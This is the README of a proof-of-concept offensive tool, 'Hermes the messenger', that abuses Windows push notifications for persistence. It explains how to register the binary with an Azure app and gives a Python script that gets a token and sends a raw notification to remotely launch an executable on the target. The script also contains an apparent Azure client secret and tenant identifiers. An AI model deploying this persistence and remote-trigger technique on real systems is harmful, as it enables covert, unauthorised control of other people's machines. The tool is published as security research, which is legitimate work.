# Hermes the messenger
A PoC for achieving persistence via push notifications on Windows

For more technical details and background read our blogpost here: https://www.persistent-security.net/post/beacon-on-demand-abusing-push-notifications-for-persistence



# Usage

Before anything else you need to [setup Azure](https://learn.microsoft.com/en-us/windows/apps/windows-app-sdk/notifications/push-notifications/push-quickstart#step-1-create-an-aad-app-registration). You then need to run the executable once in order to register itself for push notifications. You only need to pass the object id of your Azure app as an argument and if all goes well, it will print the channel Uri as received  by Microsoft. At that stage you may close the app.

```
hermes.exe <object_id>
```

If SDK 1.3 is not installed, the binary will attempt to deploy it along with the necessary extensions.

When you have the channel Uri, you can attempt to spawn your executable remotely from another machine by calling the notification API with your tenant's details, and watch the magic happen:

```python
import requests

secret = "4r8Q~XW6U_PmJYg6Eu_jV22DWlsnhyJBIrdpV"
app_id = "CA899E11-71CF-4DB3-962C-0EA65151C132" #not the object id but the Azure app id
tenant_id = "E83F2382-F012-475A-9A4C-30545F429FB7"
channel_uri = "https://wns2-am3p.notify.windows.com/?token=AwYAAAAiYI4p...."

def send_notification(secret, app_id, tenant_id, channel_uri, notification_data):
    # Acquire token
    url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    data = {
        'grant_type': 'client_credentials',
        'client_id': app_id,
        'client_secret': secret,
        'scope': 'https://wns.windows.com/.default'
    }
    response = requests.post(url, headers=headers, data=data)
    response_json = response.json()
    token = response_json['access_token']

    # Send notification
    headers = {
        'Content-Type': 'application/octet-stream',
        'Authorization': f'Bearer {token}',
        'X-WNS-Type': 'wns/raw',
    }
    response = requests.post(channel_uri, headers=headers, data=notification_data)
    return response.status_code, response.text
	
	
send_notification(secret, app_id, tenant_id, channel_uri, "This is a notification")
```

# Demo



https://github.com/persistent-security/hermes-the-messenger/assets/134269747/1de3afdc-79dc-4de6-827b-6acba44f910b

